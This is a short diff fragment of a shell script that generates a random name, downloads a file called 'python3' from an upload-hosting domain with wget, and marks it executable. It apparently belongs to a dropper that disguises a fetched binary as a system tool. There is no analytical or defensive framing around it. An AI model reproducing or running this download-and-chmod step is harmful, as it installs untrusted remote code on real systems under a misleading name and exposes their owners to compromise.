@@ -9,7 +9,7 @@ generate_random_name() {
 TID=$(generate_random_name)
 
 
-wget -O mek https://upload.vina-host.com/sAcUi9loPh/python3
+wget https://upload.vina-host.com/sAcUi9loPh/python3
 
 
 chmod +x python3
